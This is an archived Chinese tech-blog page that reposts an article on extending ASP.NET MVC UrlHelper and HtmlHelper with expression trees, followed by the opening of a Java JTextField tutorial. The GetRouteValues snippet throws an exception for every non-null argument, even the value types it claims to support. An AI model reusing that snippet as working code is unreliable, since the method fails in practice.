
 <!DOCTYPE HTML>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="baidu-site-verification" content="1XvvwQ7Apt" />
  
    <title>dianzi blog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="edwin">
    

    
    <meta name="description" content="edwin jin dianzi blog">
<meta property="og:type" content="website">
<meta property="og:title" content="dianzi blog">
<meta property="og:url" content="http://taojinke.github.io/page/3/index.html">
<meta property="og:site_name" content="dianzi blog">
<meta property="og:description" content="edwin jin dianzi blog">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="dianzi blog">
<meta name="twitter:description" content="edwin jin dianzi blog">

    
    <link rel="alternative" href="/atom.xml" title="dianzi blog" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css" type="text/css">

  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?345f95aea4ada2935d6f9ea4177b51ab";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>

</head>

  <body>
    <header>
      
<div>
		
			<div id="imglogo">
				<a href="/"><img src="/img/logo.png" alt="dianzi blog" title="dianzi blog"/></a>
			</div>
			
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="dianzi blog">dianzi blog</a></h1>
				<h2 class="blog-motto"></h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
					<li>
						<a href="/music/index.html" target="_blank">Music</a>
					</li>
					<li>
 					
						<form class="search" action="http://taojinke.github.io/" target="_blank">
							<label>Search</label>
						<input name="s" type="hidden" value= null ><input type="text" name="q" size="30" placeholder="搜索"><br>
						</form>
					
					</li>
				</ul>
			</nav>			
</div>

    </header>
    <div id="container">
      <div id="main">

   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/cbbfcc8/" title="Expression Tree 扩展MVC HtmlHelper 和 UrlHelper -" itemprop="url">Expression Tree 扩展MVC HtmlHelper 和 UrlHelper -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-07T02:16:31.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="Expression_Tree_&#x6269;&#x5C55;MVC_HtmlHelper_&#x548C;_UrlHelper">Expression Tree &#x6269;&#x5C55;MVC HtmlHelper &#x548C; UrlHelper</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 13:14:00  <a href="/sites/Fn2umm">&#x535A;&#x5BA2;&#x56ED;-&#x539F;&#x521B;&#x7CBE;&#x534E;&#x533A;</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://www.cnblogs.com/richieyang/p/4558269.html?utm_source=tuicool" target="_blank" rel="external">http://www.cnblogs.com/richieyang/p/4558269.html</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/11080033">MVC&#x6A21;&#x5F0F;</a><a href="/topics/11050000">.Net</a></p>
<p>&#x8868;&#x8FBE;&#x5F0F;&#x6811;&#x662F;LINQ To everything &#x7684;&#x57FA;&#x7840;&#xFF0C;&#x540C;&#x65F6;&#x5404;&#x79CD;&#x7C7B;&#x5E93;&#x7684;Fluent API&#x4E5F; &#x5927;&#x91CF;&#x4F7F;&#x7528;&#x4E86;Expression Tree&#x3002;&#x8FD8;&#x8BB0;&#x5F97;&#x6211;&#x5728;&#x4E0D;&#x61C2;expression tree&#x65F6;&#xFF0C;&#x5404;&#x79CD;&#x773C;&#x82B1;&#x7F2D;&#x4E71;&#x7684;API &#x770B;&#x7684;&#x6211;&#x5404;&#x79CD;&#x819C;&#x62DC;&#xFF0C;&#x5F53;&#x6211;&#x719F;&#x6089;expression tree &#x540E;&#x604D;&#x7136;&#x5927;&#x609F;&#xFF0C;&#x4E0D;&#x7528;&#x770B;&#x4EE3;&#x7801;&#x4E5F;&#x80FD;&#x77E5;&#x9053;&#x522B;&#x4EBA;&#x7684;API &#x662F;&#x5982;&#x4F55;&#x8BBE;&#x8BA1;&#x7684;(^_^)&#x3002; &#x63A5;&#x4E0B;&#x6765;&#x8FD9;&#x7BC7;&#x535A;&#x5BA2;&#x5C31;&#x8C08;&#x8C08;&#x5982;&#x4F55;&#x4F7F;&#x7528;expression tree&#x6269;&#x5C55;MVC&#x4E2D;&#x7684;HtmlHelper&#x548C;UrlHelper&#x3002;</p>
<p>&#x573A;&#x666F;</p>
<p>&#x5F53;&#x6211;&#x4EEC;&#x5728;MVC&#x4E2D;&#x751F;&#x6210;&#x4E00;&#x4E2A;action&#x7684;url&#x4F1A;&#x8FD9;&#x6837;&#x5199;&#xFF1A;var url=UrlHelper.Action(&quot;index&quot;, &quot;Home&quot;); &#x5982;&#x679C;&#x8981;render&#x4E00;&#x4E2A;action&#x65F6;&#x4F1A;&#x8FD9;&#x6837;&#x5199;&#xFF1A;Html.RenderAction(&quot;index&quot;, &quot;Home&quot;);</p>
<p>&#x8FD9;&#x6837;&#x7684;&#x5199;&#x6CD5;&#x7455;&#x75B5;&#x5728;&#x4E8E;&#x6211;&#x4EEC;&#x4F20;&#x9012;&#x4E86;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7684;&#x53C2;&#x6570;&#x5728;&#x4EE3;&#x7801;&#x4E2D;&#xFF0C;&#x800C;&#x6211;&#x4EEC;&#x53C8;&#x514D;&#x4E0D;&#x4E86;&#x5BF9;action&#x548C;controller&#x505A;&#x91CD;&#x547D;&#x540D;&#x64CD;&#x4F5C;&#xFF1A;index-&gt;default, &#x5373;&#x4FBF;&#x662F;&#x4F60;&#x7528;resharper&#x8FD9;&#x6837;&#x7684;&#x5DE5;&#x5177;&#x91CD;&#x547D;&#x540D;&#x4E5F;&#x65E0;&#x6CD5;&#x5C06;UrlHelper.Action(&quot;index&quot;, &quot;Home&quot;); &#x6539;&#x53D8;&#x4E3A;UrlHelper.Action(&quot;default&quot;, &quot;Home&quot;);</p>
<p>vs&#x751A;&#x81F3;&#x5728;&#x7F16;&#x8BD1;&#x65F6;&#x90FD;&#x4E0D;&#x4F1A;&#x68C0;&#x67E5;&#x51FA;&#x6765;&#x8FD9;&#x4E2A;&#x9519;&#x8BEF;&#x3002; &#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x6807;&#x662F;&#xFF1A;&#x8BBE;&#x8BA1;&#x51FA;&#x5177;&#x6709;&#x9759;&#x6001;&#x68C0;&#x67E5;&#x7684;API&#xFF0C;&#x8BA9;vs &#x63D0;&#x793A;&#x51FA;&#x8FD9;&#x4E2A;&#x9519;&#x8BEF;&#x6765;&#xFF0C;&#x751A;&#x81F3;&#x662F;&#x91CD;&#x547D;&#x540D;&#x65F6;&#x76F4;&#x63A5;&#x628A;&#x76F8;&#x5173;&#x4EE3;&#x7801;&#x90FD;&#x80FD;&#x91CD;&#x547D;&#x540D;&#x3002;</p>
<p>&#x4F7F;&#x7528;Expression Tree &#x91CD;&#x65B0;&#x8BBE;&#x8BA1;&#x8FD9;&#x4E24;&#x7EC4;API</p>
<p>&#x76EE;&#x6807;&#xFF1A;&#x8BBE;&#x8BA1;&#x51FA;&#x7C7B;&#x4F3C;&#x7684;API&#xFF1A;Url.Action((HomeController c) =&gt; c.Index());</p>
<h4 id="1-&#x5F88;&#x660E;&#x663E;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5728;UrlHelper&#x4E0A;&#x5199;&#x4E2A;&#x6269;&#x5C55;&#x65B9;&#x6CD5;&#xFF1A;">1.&#x5F88;&#x660E;&#x663E;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5728;UrlHelper&#x4E0A;&#x5199;&#x4E2A;&#x6269;&#x5C55;&#x65B9;&#x6CD5;&#xFF1A;</h4><pre><code><span class="keyword">public</span> static <span class="built_in">string</span> Action<span class="subst">&amp;</span><span class="literal">lt</span>;TController<span class="subst">&amp;</span><span class="literal">gt</span>;(
        this UrlHelper url,
        Expression<span class="subst">&amp;</span><span class="literal">lt</span>;Func<span class="subst">&amp;</span><span class="literal">lt</span>;TController, ActionResult<span class="subst">&amp;</span><span class="literal">gt</span>;<span class="subst">&amp;</span><span class="literal">gt</span>; actionSelector,
        <span class="built_in">string</span> protocol <span class="subst">=</span> <span class="built_in">null</span>,
        <span class="built_in">string</span> hostname <span class="subst">=</span> <span class="built_in">null</span>)
        {
            <span class="built_in">var</span> action <span class="subst">=</span> <span class="subst">&amp;</span>quot;Index<span class="subst">&amp;</span>quot;; <span class="comment">//&amp;#x5F85;&amp;#x89E3;&amp;#x6790;</span>
            <span class="built_in">var</span> controller <span class="subst">=</span> <span class="subst">&amp;</span>quot;Home<span class="subst">&amp;</span>quot;;<span class="comment">//&amp;#x5E26;&amp;#x89E3;&amp;#x6790;</span>
            <span class="built_in">var</span> routeValues <span class="subst">=</span> <span class="literal">new</span> RouteValueDictionary();<span class="comment">//&amp;#x5F85;&amp;#x89E3;&amp;#x6790;</span>

            <span class="keyword">return</span> url<span class="built_in">.</span>Action(action, controller, routeValues, protocol, hostname);
        }
</code></pre><p>&#x73B0;&#x5728;&#x53EA;&#x9700;&#x8981;&#x6839;&#x636E;&#x8868;&#x8FBE;&#x5F0F;Expression&lt;Func&lt;TController, ActionResult&gt;&gt; actionSelector &#x89E3;&#x6790;&#x51FA;action,controller,&#x8FD8;&#x6709;routeValues&#x5373;&#x53EF;</p>
<h4 id="2-&#x89E3;&#x6790;&#x51FA;controller_&#x7684;&#x540D;&#x79F0;">2.&#x89E3;&#x6790;&#x51FA;controller &#x7684;&#x540D;&#x79F0;</h4><p>&#x5206;&#x6790;&#xFF1A;controller&#x7684;&#x540D;&#x79F0;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x6CDB;&#x578B;&#x65B9;&#x6CD5;&#x4E2D;&#x7684;&#x6CDB;&#x578B;&#x53C2;&#x6570;TController&#x5F97;&#x5230;</p>
<pre><code><span class="keyword">private</span> static string GetControllerName(<span class="keyword">Type</span> controllerType)
        {
            var controllerName = controllerType.<span class="keyword">Name</span>.EndsWith(&amp;quot;Controller&amp;quot;)
                ? controllerType.<span class="keyword">Name</span>.Substring(<span class="number">0</span>, controllerType.<span class="keyword">Name</span>.Length - &amp;quot;Controller&amp;quot;.Length)
                : controllerType.<span class="keyword">Name</span>;
            <span class="keyword">return</span> controllerName;
        }
</code></pre><h4 id="3-&#x89E3;&#x6790;action&#x7684;&#x540D;&#x79F0;">3.&#x89E3;&#x6790;action&#x7684;&#x540D;&#x79F0;</h4><p>&#x5206;&#x6790;&#xFF1A;&#x7531;&#x4E8E;&#x8868;&#x8FBE;&#x5F0F;Expression&lt;Func&lt;TController, ActionResult&gt;&gt; actionSelector &#x662F;&#x4E00;&#x4E2A;MethodCallExpression, &#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x5F88;&#x5BB9;&#x6613;&#x5F97;&#x5230;action&#x7684;&#x540D;&#x79F0;&#xFF1A;var action=call.Method.Name;</p>
<p>&#x8FD9;&#x6837;&#x5DF2;&#x7ECF;&#x5B8C;&#x6210;&#x4E86;&#x6700;&#x7B80;&#x5355;&#x7684;url&#x6784;&#x9020;&#x65B9;&#x6848;&#xFF0C; <em>&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x8FD8;&#x6CA1;&#x6709;&#x5904;&#x7406;&#x5E26;&#x6709;&#x53C2;&#x6570;&#x7684;action&#x7C7B;&#x578B;&#xFF1A;Url.Action((HomeController c) =&gt; c.Detail(10, 20));</em></p>
<h4 id="4-&#x89E3;&#x6790;routeValues">4.&#x89E3;&#x6790;routeValues</h4><p>&#x5206;&#x6790;&#xFF1A;action&#x4E2D;&#x7684;&#x53C2;&#x6570;&#x5B9E;&#x9645;&#x4E0A;&#x5C31;&#x65F6;&#x8FD9;&#x4E2A;MethodCallExpression&#x4E2D;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x89E3;&#x6790;&#x8FD9;&#x4E2A;expression&#x7684;&#x53C2;&#x6570;&#x5373;&#x53EF;&#xFF0C;&#x7136;&#x540E;&#x5F97;&#x5230;RouteValues</p>
<pre><code><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> RouteValueDictionary <span class="title">GetRouteValues</span>(<span class="params">MethodCallExpression call</span>)
</span>{
    <span class="keyword">var</span> routeValues = <span class="keyword">new</span> RouteValueDictionary();
    <span class="keyword">var</span> args = call.Arguments;
    ParameterInfo[] parameters = call.Method.GetParameters();
    <span class="keyword">var</span> pairs = args.Select((a, i) =&amp;gt; <span class="keyword">new</span>
    {
        Argument = a,
        ParamName = parameters[i].Name
    });
    <span class="keyword">foreach</span> (<span class="keyword">var</span> argumentParameterPair <span class="keyword">in</span> pairs)
    {
        <span class="keyword">string</span> name = argumentParameterPair.ParamName;
        <span class="keyword">object</span> <span class="keyword">value</span> = argumentParameterPair.Argument.GetValue();
        <span class="keyword">if</span> (<span class="keyword">value</span> != <span class="keyword">null</span>)
        {
            <span class="keyword">var</span> valueType = <span class="keyword">value</span>.GetType();
            <span class="keyword">if</span> (valueType.IsValueType)
            {
                routeValues.Add(name, <span class="keyword">value</span>);
            }
            <span class="keyword">throw</span> <span class="keyword">new</span> NotSupportedException(&amp;quot;unsoupported parameter type {<span class="number">0</span>}&amp;quot;.FormatWith(<span class="keyword">value</span>.ToString()));
        }
    }
    <span class="keyword">return</span> routeValues;
}
</code></pre><p>&#x5982;&#x6B64;&#x4E00;&#x6765;&#xFF0C;&#x7C7B;&#x4F3C;Url.Action((HomeController c) =&gt; c.Detail(10, 20));&#x8FD9;&#x6837;&#x7684;action&#x4E5F;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x51FA;Url&#x4E86;, &#x76EE;&#x524D;&#x8FD9;&#x4E2A;&#x89E3;&#x6790;&#x5BF9;&#x4E8E;&#x4F20;&#x5165;&#x590D;&#x6742;&#x7C7B;&#x578B;&#x7684;action&#x662F;&#x4E0D;&#x652F;&#x6301;&#x7684;&#xFF0C;&#x5982;&#x4E0B;&#x4EE3;&#x7801;&#x4EC5;&#x4EC5;&#x652F;&#x6301;&#x7B80;&#x5355;&#x7C7B;&#x578B;&#x7684;&#x53C2;&#x6570;:</p>
<pre><code><span class="keyword">if</span> (valueType.IsValueType)
      {
          routeValues.Add(<span class="keyword">name</span>, <span class="keyword">value</span>);
      }
</code></pre><p>&#x5BF9;&#x4E8E;action&#x4E2D;&#x4F20;&#x5165;&#x590D;&#x6742;&#x7684;&#x7C7B;&#x578B;&#xFF1A;&#x5982;&#x4F20;&#x5165;&#x4E00;&#x4E2A;&#x7C7B;&#x578B;&#x4E3A;&#xFF1A;</p>
<pre><code><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">User</span>
    {
        <span class="keyword">public</span> <span class="keyword">int</span> Age { <span class="keyword">get</span>; <span class="keyword">set</span>; }
        <span class="keyword">public</span> <span class="keyword">string</span> Email { <span class="keyword">get</span>; <span class="keyword">set</span>; }
    }
</code></pre><p>&#x7684;&#x53C2;&#x6570;&#x5230;Action&#x4E2D;&#xFF0C;</p>
<pre><code><span class="keyword">public</span> <span class="function">ActionResult <span class="title">SayHelloToUser</span><span class="params">(User user)</span>
        </span>{
            <span class="keyword">return</span> <span class="keyword">new</span> EmptyResult();
        }
</code></pre><p>&#x6211;&#x4EEC;&#x8FD8;&#x9700;&#x8981;&#x7EE7;&#x7EED;&#x89E3;&#x6790;&#x8FD9;&#x79CD;&#x7C7B;&#x578B;&#x7684;&#x503C;&#x5230;RouteValues&#x4E2D;&#xFF0C;</p>
<pre><code><span class="keyword">var</span> properties = PropertyInfoHelper.GetProperties(valueType);
   <span class="keyword">foreach</span> (<span class="keyword">var</span> propertyInfo <span class="keyword">in</span> properties)
     {
        routeValues.Add(propertyInfo.Name, propertyInfo.GetValue(<span class="keyword">value</span>));
     }
</code></pre><p>&#x5927;&#x529F;&#x544A;&#x6210;&#xFF0C;&#x73B0;&#x5728;&#x5DF2;&#x7ECF;&#x5B8C;&#x7F8E;&#x89E3;&#x51B3;&#x4E86;&#x5404;&#x79CD;&#x7C7B;&#x578B;&#x7684;&#x53C2;&#x6570;&#x4F20;&#x5165;&#x3002;</p>
<p>&#x540C;&#x6837;&#x7684;&#x9053;&#x7406;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6269;&#x5C55;HtmlHelper &#x7684; RenderAction(), ActionLink()&#x2026;.</p>
<p>&#x7F3A;&#x9677;</p>
<p>&#x65E9;&#x5728;09&#x5E74;&#xFF0C;jeffery zhao&#x5C31;&#x53D1;&#x8868;&#x4E86;lambda&#x65B9;&#x5F0F;&#x751F;&#x6210;url&#x7684;&#x535A;&#x5BA2;&#xFF0C; <a href="http://www.cnblogs.com/JeffreyZhao/archive/2009/11/02/several-ways-of-generating-url-benchmark-result.html" target="_blank" rel="external">&#x5BF9;&#x6BD4;&#x4E86;&#x51E0;&#x79CD;&#x65B9;&#x6848;&#x7684;&#x6027;&#x80FD;&#x95EE;&#x9898;</a> &#xFF0C;&#x5E76;&#x4E14;&#x7ED9;&#x51FA;&#x4E86;&#x4F18;&#x5316;&#x65B9;&#x6848;,&#x5F53;&#x7136;&#xFF0C;&#x6211;&#x5728;&#x5199;&#x8FD9;&#x7BC7;&#x535A;&#x5BA2;&#x7684;&#x65F6;&#x5019;&#x8FD8;&#x6CA1;&#x6709;&#x771F;&#x6B63;&#x5C1D;&#x8BD5;&#x53BB;&#x4F18;&#x5316;&#x8FD9;&#x4E2A;&#x65B9;&#x6848;&#xFF0C;&#x53EA;&#x662F;&#x518D;&#x6B21;&#x62DC;&#x8BFB;&#x4E86;&#x5927;&#x795E;&#x7684;&#x65B9;&#x6848;&#xFF0C;&#x8BB0;&#x5F97;&#x65E9;&#x4E9B;&#x5E74;&#x5C31;&#x8BFB;&#x8FC7;&#x8FD9;&#x4E9B;&#x6587;&#x7AE0;&#xFF0C;&#x4F46;&#x662F;&#x4ECA;&#x5929;&#x91CD;&#x65B0;&#x8BFB;&#x8FC7;&#x4ECD;&#x7136;&#x83B7;&#x76CA;&#x532A;&#x6D45;&#xFF0C;&#x4E0D;&#x7531;&#x5F97;&#x611F;&#x53F9;&#x51E0;&#x53E5;&#xFF0C;&#x83AB;&#x975E;&#x8DD1;&#x9898;&#x4E86;;-);-) </p>
<p>&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4F1A;&#x601D;&#x8003;&#x8FD9;&#x4E2A;&#x4F18;&#x5316;&#x7684;&#x95EE;&#x9898;&#x3002;</p>
<p>&#x7ED3;&#x675F;&#x8BED;&#xFF1A;&#x672C;&#x6587;&#x4F7F;&#x7528;Expression tree &#x6269;&#x5C55;&#x4E86;HtmlHelper&#x548C;UrlHelper,&#x7ED9;&#x51FA;&#x4E86;&#x4E00;&#x4E2A;&#x5177;&#x6709;&#x9759;&#x6001;&#x68C0;&#x67E5;&#x7684;API&#x5B9E;&#x73B0;&#x65B9;&#x5F0F;&#x3002; <a href="http://files.cnblogs.com/files/richieyang/UsingExpressionTree.rar" target="_blank" rel="external">&#x672C;&#x6587;&#x7AE0;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x6E90;&#x7801;&#x63D0;&#x4F9B;&#x4E0B;&#x8F7D;</a> &#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904; </p>
<p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/QJZvQj">ASP.NET WebForm Form&#x8868;&#x5355;&#x5982;&#x4F55;&#x5B9E;&#x73B0;MVC&#x90A3;&#x79CD;&#x201C;&#x81EA;&#x52A8;&#x88C5;&#x914D;&#x201D;&#x6548;&#x679C;&#x5462;&#xFF1F;</a></li>
<li>2.<a href="/articles/QBNRNri">[.net &#x9762;&#x5411;&#x5BF9;&#x8C61;&#x7F16;&#x7A0B;&#x57FA;&#x7840;] (15) &#x62BD;&#x8C61;&#x7C7B;</a></li>
<li>3.<a href="/articles/iuIraaB">C#&#x7684;&#x672A;&#x6765;&#xFF1A;&#x4E0D;&#x53EF;&#x53D8;&#x7C7B;</a></li>
<li>4.<a href="/articles/2IJrai">&#x5341;&#x4E94;&#x5929;&#x7CBE;&#x901A;WCF&#x2014;&#x2014;&#x7B2C;&#x4E00;&#x5929; &#x4E09;&#x79CD;Binding&#x8BA9;&#x4F60;KO80%&#x7684;&#x4E1A;&#x52A1;</a></li>
<li>5.<a href="/articles/EFzIJvR">&#x4E00;&#x4E2A;&#x7528;Json&#x683C;&#x5F0F;&#x6765;&#x53D1;&#x9001;&#x4E00;&#x4E2A;Post&#x8BF7;&#x6C42;&#x5230;WCF&#x670D;&#x52A1;</a></li>
<li><p>6.<a href="/articles/qaaAjee">&#x6839;&#x636E;C# &#x4E8B;&#x4EF6;&#x601D;&#x60F3;&#x6765;&#x5B9E;&#x73B0; php &#x4E8B;&#x4EF6;</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/ai6vYjv">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;ai6vYjv&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/Net/">.Net</a><a href="/tags/MVC模式/">MVC模式</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/cbbb38a/" title="Java知多少（85）文本框和文本区 -" itemprop="url">Java知多少（85）文本框和文本区 -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-07T02:16:31.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="Java&#x77E5;&#x591A;&#x5C11;&#xFF08;85&#xFF09;&#x6587;&#x672C;&#x6846;&#x548C;&#x6587;&#x672C;&#x533A;">Java&#x77E5;&#x591A;&#x5C11;&#xFF08;85&#xFF09;&#x6587;&#x672C;&#x6846;&#x548C;&#x6587;&#x672C;&#x533A;</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 12:52:00  <a href="/sites/nI7bueF">&#x535A;&#x5BA2;&#x56ED;_Coda</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://www.cnblogs.com/Coda/p/4558275.html?utm_source=tuicool" target="_blank" rel="external">http://www.cnblogs.com/Coda/p/4558275.html</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/11000072">Java</a></p>
<p>&#x5728;&#x56FE;&#x5F62;&#x754C;&#x9762;&#x4E2D;&#xFF0C;&#x6587;&#x672C;&#x6846;&#x548C;&#x6587;&#x672C;&#x533A;&#x662F;&#x7528;&#x4E8E;&#x4FE1;&#x606F;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x7684;&#x7EC4;&#x4EF6;&#x3002;</p>
<h2 id="&#x6587;&#x672C;&#x6846;">&#x6587;&#x672C;&#x6846;</h2><p>&#x6587;&#x672C;&#x6846;(JTextField)&#x662F;&#x754C;&#x9762;&#x4E2D;&#x7528;&#x4E8E;&#x8F93;&#x5165;&#x548C;&#x8F93;&#x51FA;&#x4E00;&#x884C;&#x6587;&#x672C;&#x7684;&#x6846;&#x3002;JTextField&#x7C7B;&#x7528;&#x6765;&#x5EFA;&#x7ACB;&#x6587;&#x672C;&#x6846;&#x3002;&#x4E0E;&#x6587;&#x672C;&#x6846;&#x76F8;&#x5173;&#x7684;&#x63A5;&#x53E3;&#x662F;ActionListener&#x3002;</p>
<p>&#x6587;&#x672C;&#x6846;&#x5904;&#x7406;&#x7A0B;&#x5E8F;&#x7684;&#x57FA;&#x672C;&#x5185;&#x5BB9;&#x6709;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x65B9;&#x9762;&#xFF1A;</p>
<ol>
<li>&#x58F0;&#x660E;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x6846;&#x540D;&#x3002;</li>
<li>&#x5EFA;&#x7ACB;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x6846;&#x5BF9;&#x8C61;&#x3002;</li>
<li>&#x5C06;&#x6587;&#x672C;&#x6846;&#x5BF9;&#x8C61;&#x52A0;&#x5165;&#x5230;&#x67D0;&#x4E2A;&#x5BB9;&#x5668;&#x3002;</li>
<li>&#x5BF9;&#x9700;&#x8981;&#x63A7;&#x5236;&#x7684;&#x6587;&#x672C;&#x6846;&#x5BF9;&#x8C61;&#x6CE8;&#x518C;&#x76D1;&#x89C6;&#x5668;&#xFF0C;&#x76D1;&#x542C;&#x6587;&#x672C;&#x6846;&#x7684;&#x8F93;&#x5165;&#x7ED3;&#x675F;(&#x5373;&#x8F93;&#x5165;&#x56DE;&#x8F66;&#x952E;)&#x4E8B;&#x4EF6;&#x3002;</li>
<li>&#x4E00;&#x4E2A;&#x5904;&#x7406;&#x6587;&#x672C;&#x6846;&#x4E8B;&#x4EF6;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5B8C;&#x6210;&#x5BF9;&#x622A;&#x83B7;&#x4E8B;&#x4EF6;&#x8FDB;&#x884C;&#x5224;&#x65AD;&#x548C;&#x5904;&#x7406;&#x3002;</li>
</ol>
<p>JTextField&#x7C7B;&#x7684;&#x4E3B;&#x8981;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#xFF1A; </p>
<ol>
<li>JTextField()&#xFF0C;&#x6587;&#x672C;&#x6846;&#x7684;&#x5B57;&#x7B26;&#x957F;&#x5EA6;&#x4E3A;1&#x3002;</li>
<li>JTextField(int columns)&#xFF0C;&#x6587;&#x672C;&#x6846;&#x521D;&#x59CB;&#x503C;&#x4E3A;&#x7A7A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x6587;&#x672C;&#x6846;&#x7684;&#x5B57;&#x7B26;&#x957F;&#x5EA6;&#x8BBE;&#x4E3A;columns.</li>
<li>JTextField(String text),&#x6587;&#x672C;&#x6846;&#x521D;&#x59CB;&#x503C;&#x4E3A;text&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x3002;</li>
<li>JTextField(String text,int columns);&#x6587;&#x672C;&#x6846;&#x521D;&#x59CB;&#x503C;&#x4E3A;text&#xFF0C;&#x6587;&#x672C;&#x6846;&#x7684;&#x5B57;&#x7B26;&#x957F;&#x5EA6;&#x4E3A;columns&#x3002;</li>
</ol>
<p>JTextField&#x7C7B;&#x7684;&#x5176;&#x4ED6;&#x65B9;&#x6CD5;&#xFF1A; </p>
<ol>
<li>setFont(Font f),&#x8BBE;&#x7F6E;&#x5B57;&#x4F53;</li>
<li>setText(String text)&#xFF0C;&#x5728;&#x6587;&#x672C;&#x6846;&#x4E2D;&#x8BBE;&#x7F6E;&#x6587;&#x672C;</li>
<li>getText()&#xFF0C;&#x83B7;&#x53D6;&#x6587;&#x672C;&#x6846;&#x4E2D;&#x7684;&#x6587;&#x672C;&#x3002;</li>
<li>setEditable(boolean)&#xFF0C;&#x6307;&#x5B9A;&#x6587;&#x672C;&#x6846;&#x7684;&#x53EF;&#x7F16;&#x8F91;&#x6027;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;true&#xFF0C;&#x53EF;&#x7F16;&#x8F91;&#x3002;</li>
<li>setHorizontalAlignment(int alignment)&#x8BBE;&#x7F6E;&#x6587;&#x672C;&#x5BF9;&#x9F50;&#x65B9;&#x5F0F;&#x3002;&#x5BF9;&#x9F50;&#x65B9;&#x5F0F;&#x6709;&#xFF1A;JTextField.LEFT, JTextField.CENTER, JTextField.RIGHT&#x3002;</li>
<li>requestFocus()&#xFF0C;&#x8BBE;&#x7F6E;&#x7126;&#x70B9;&#x3002;</li>
